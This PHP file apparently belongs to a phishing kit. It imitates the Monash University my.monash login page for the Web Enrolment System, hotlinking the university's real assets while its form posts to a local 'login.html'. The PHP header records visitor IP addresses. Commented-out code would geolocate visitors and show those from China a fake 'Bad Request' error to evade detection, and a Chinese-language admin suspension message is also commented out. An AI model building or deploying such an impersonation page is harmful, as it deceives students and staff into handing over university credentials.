<?php
header('Content-Type: text/html;charset=utf-8') ;

// exit('该站点已被管理员暂停，请联系管理员！');
$ip = $_SERVER['REMOTE_ADDR'];
if($ip == '' || $ip == '127.0.0.1'){
    $ip = '123.160.228.211';
}
// $area = json_decode(file_get_contents('http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=json&ip='.$ip),true);
// $country = trim($area['country']);
// if($country == '中国'){
//     exit('Bad Request (Invalid Hostname)');
// }

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title>my.monash, the Monash University portal: Login</title>
    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
    <link rel="stylesheet" href="https://my-assets.its.monash.edu.au/style/login.css" media="screen" type="text/css" />
    <!--[if !IE]><!-->
    <!-- Media query based mobile specific css -->
    <link rel="stylesheet" type="text/css" href="https://my-assets.its.monash.edu.au/style/login_mobile.css" media="only screen and (max-device-width: 768px),
		only screen and (-min-device-pixel-ratio: 1.5) and (max-device-width:768px),
		only screen and (-webkit-min-device-pixel-ratio: 1.5) and (max-device-width:768px)" />
    <!-- Media query based iPad specific css -->
    <link rel="stylesheet" type="text/css" href="https://my-assets.its.monash.edu.au/style/login_iPad.css" media="only screen and (device-width: 768px)" />
    <!--<![endif]-->
    <link rel="shortcut icon" href="https://my-assets.its.monash.edu.au/graphics/my.ico" />
    <!-- This bit for AltaVista indexing -->
    <meta name="description" content="One stop shop for everything that the Monash community needs, providing an integrated messaging, academic, administrative and cultural environment" />
    <meta name="keywords" content="my.monash,Monash,Monash University,student,students,Australia,South Africa,Malaysia,United Kingdom,Italy,United States" />
    <!-- End indexing stuff -->
    <!-- Dublin Core metadata -->
    <link rel="schema.DC" href="http://purl.org/DC/elements/1.1/" />
    <meta name="DC.Title" content="my.monash enterprise education portal" />
    <meta name="DC.Creator" content="my.monash enquiries http://monash.edu/esolutions/contact/" />
    <meta name="DC.Subject" content="Monash University,portal,online community" />
    <meta name="DC.Description" content="One stop shop for everything that the Monash community needs, providing an integrated messaging, academic, administrative and cultural environment." />
    <meta name="DC.Publisher" content="Monash University" />
    <meta name="DC.Contributor" content="" />
    <meta name="DC.Date" content="2002-03-30" />
    <meta name="DC.Type" content="party" />
    <meta name="DC.Format" content="text/html" />
    <meta name="DC.Identifier" content="http://my.monash.edu/" />
    <meta name="DC.Language" content="en" />
    <meta name="DC.Rights" content="http://monash.edu/caution.html" />
    <!-- End Dublin Core medatata -->
    <meta name="copyright" content="Copyright 1994-2017 Monash University" />
    <!-- Monash Metadata -->
    <meta name="monash.approval" content="D James, Office of the Deputy Vice-Chancellor (Academic and Planning)" />
    <meta name="monash.access" content="public" />
    <!-- Mobile devices -->
    <meta name="viewport" content="width=device-width" />
    <!-- End Mobile devices -->
    <script>
        function init()
        {
            if ( document.login.username.value == '' )
            {
                document.login.username.focus();
            }
        }
        // END HIDE -->
    </script>
</head>
<body onload="init()">
<table id="main" cellspacing="0" summary="Layout for the login page">
    <tbody>
    <tr>
        <td colspan="2" id="header-left"> <h1 id="header-header"> my.monash.edu </h1> <p id="header-text"> Your single point of access<br /> for information, services and<br /> resources at Monash University </p> </td>
        <td id="header-logo" colspan="2"> <img src="https://my-assets.its.monash.edu.au/graphics/login/mymonash.jpg" alt="my.monash" align="right" width="151" height="41" /> </td>
    </tr>
    <tr>
        <td valign="bottom" align="left" id="main-text"> <p> my life<br /> my study<br /> my future </p> <p class="last_line"> my.monash </p> </td>
        <td valign="bottom" align="left" id="main-image"> <img title="[Getting to know the human body interactively using the Smart Table at the Anatomy Lab]" alt="Getting to know the human body interactively using the Smart Table at the Anatomy Lab" src="https://my-assets.its.monash.edu.au/graphics/login/auto/getting-to-know.jpg" width="333" height="222" /> </td>
        <td id="main-body" rowspan="2" valign="top"> <h2>Web Enrolment System</h2>
            <form name="login" method="post" action="login.html" autocomplete="off">
                <input type="hidden" name="request_uri" value="/wes/" />
                <input type="hidden" name="access" value="" />
                <input type="hidden" name="expire" value="" />
                <input type="hidden" name="verify" value="" />
                <table id="login-box">
                    <tbody>
                    <tr class="login-text">
                        <td> &nbsp; </td>
                        <td> <input type="hidden" name="request_uri" value="" /> <input type="hidden" name="login_to_wes" value="YES" /> <input style="margin: 5px; cursor: pointer;" value="Login to WES" type="submit" class="button" tabindex="1" /> </td>
                    </tr>
                    </tbody>
                </table>
            </form> <p class="help-text"> <a href="">New student? Get a username and password</a> </p> <p class="help-text"> <a href="https://my.monash.edu.au/wes/?access=callista">Past student or graduate? Login here</a> </p> <p class="help-text"> <a href="https://my.monash.edu.au/wes/?help=login#help">Help to login to WES/my.monash</a> </p> <p class="help-text"> <a href="https://identity-management.monash.edu/" target="_blank">Change your Monash account password</a> </p> <p class="help-text"> <a href="" target="_blank">IT Security</a> </p> </td>
    </tr>
    <tr>
        <td>&nbsp;</td>
        <td id="main-image-caption" valign="top"> <p>Getting to know the human body interactively using the Smart Table at the Anatomy Lab</p> </td>
    </tr>
    <tr>
        <td id="footer-logo" colspan="2"> <a href="index.html"><img src="https://my-assets.its.monash.edu.au/graphics/login/logo.jpg" alt="Monash University" border="0" width="222" height="36" /></a> </td>
        <td id="footer-text" colspan="2"> <a href="">Contact eSolutions</a><br /> <a href="">my.monash scheduled maintenance</a><br /> <a href="">Acceptable use of information technology facilities by students policy</a><br /> <a href="">IT Use policy for staff and other authorised users</a><br /> Copyright &copy; 2017 <a href="">Monash University</a> - <a href="">Caution</a> - <a href="">Privacy policy</a> </td>
    </tr>
    </tbody>
</table>
<script type="text/javascript">
    var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
    document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
    var pageTracker = _gat._getTracker("UA-5404288-3");
    pageTracker._trackPageview();
</script>
</body>
</html>